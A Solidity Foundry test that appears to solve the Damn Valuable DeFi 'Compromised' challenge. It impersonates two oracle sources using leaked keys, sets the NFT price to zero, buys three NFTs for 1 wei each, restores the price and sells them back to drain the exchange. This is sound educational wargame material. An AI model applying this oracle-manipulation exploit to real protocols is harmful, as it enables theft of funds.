// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../../src/compromised/Exchange.sol";
import "../../src/compromised/TrustfulOracle.sol";
import "../../src/compromised/TrustfulOracleInitializer.sol";

import "../../src/DamnValuableNFT.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

contract CompromisedTest is BaseTest {
    uint256 INITIAL_NFT_PRICE = 999 ether;
    uint256 INITIAL_ATTACKER_TOKEN_BALANCE = 0.1 ether;
    uint256 INITIAL_EXCHANGE_TOKEN_BALANCE = (INITIAL_NFT_PRICE * 3);

    DamnValuableNFT token;
    TrustfulOracle oracle;
    TrustfulOracleInitializer trustfulOracleInitializer;
    Exchange exchange;

    string public symbol = "DVNFT";
    address attacker;
    address source1;
    address source2;
    address source3;

    constructor() {
        string[] memory labels = new string[](4);
        labels[0] = "Attacker";
        labels[1] = "Source1";
        labels[2] = "Source2";
        labels[3] = "Source3";

        preSetup(4, INITIAL_ATTACKER_TOKEN_BALANCE, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];
        source1 = users[1];
        source2 = users[2];
        source3 = users[3];

        address[] memory addresses = new address[](3);
        addresses[0] = source1;
        addresses[1] = source2;
        addresses[2] = source3;

        string[] memory symbols = new string[](3);
        symbols[0] = symbol;
        symbols[1] = symbol;
        symbols[2] = symbol;

        uint256[] memory initialPrices = new uint256[](3);
        initialPrices[0] = INITIAL_NFT_PRICE;
        initialPrices[1] = INITIAL_NFT_PRICE;
        initialPrices[2] = INITIAL_NFT_PRICE;

        trustfulOracleInitializer = new TrustfulOracleInitializer(
            addresses,
            symbols,
            initialPrices
        );
        oracle = trustfulOracleInitializer.oracle();
        exchange = new Exchange(address(oracle));
        token = exchange.token();

        vm.deal(address(exchange), INITIAL_EXCHANGE_TOKEN_BALANCE);

        assertEq(address(exchange).balance, INITIAL_EXCHANGE_TOKEN_BALANCE);
        assertEq(address(attacker).balance, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq((oracle).getMedianPrice(symbol), INITIAL_NFT_PRICE);
    }

    function test_ExploitCompromised() public {
        runTest();
    }

    function exploit() internal override {
        // If you're reading this, I should admit that I knew that those numbers in task are private keys.
        // So let's just assume that it's obvious and continue with vm.startPrank(source1/2) like we know private keys;

        vm.startPrank(source1);
        oracle.postPrice(symbol, 0);
        vm.stopPrank();
        vm.startPrank(source2);
        oracle.postPrice(symbol, 0);
        vm.stopPrank();
        assertEq((oracle).getMedianPrice(symbol), 0);

        vm.startPrank(attacker);
        exchange.buyOne{value: 1}();
        exchange.buyOne{value: 1}();
        exchange.buyOne{value: 1}();
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice(symbol, INITIAL_NFT_PRICE);
        vm.stopPrank();
        vm.startPrank(source2);
        oracle.postPrice(symbol, INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(attacker);
        token.approve(address(exchange), 0);
        token.approve(address(exchange), 1);
        token.approve(address(exchange), 2);
        exchange.sellOne(0);
        assertEq(address(exchange).balance, ((INITIAL_NFT_PRICE * 2)));

        exchange.sellOne(1);
        assertEq(address(exchange).balance, ((INITIAL_NFT_PRICE)));

        exchange.sellOne(2);

        vm.stopPrank();
    }

    function success() internal override {
        assertEq(address(exchange).balance, 0);
        assertEq(
            address(attacker).balance,
            INITIAL_ATTACKER_TOKEN_BALANCE + INITIAL_EXCHANGE_TOKEN_BALANCE
        );
    }
}
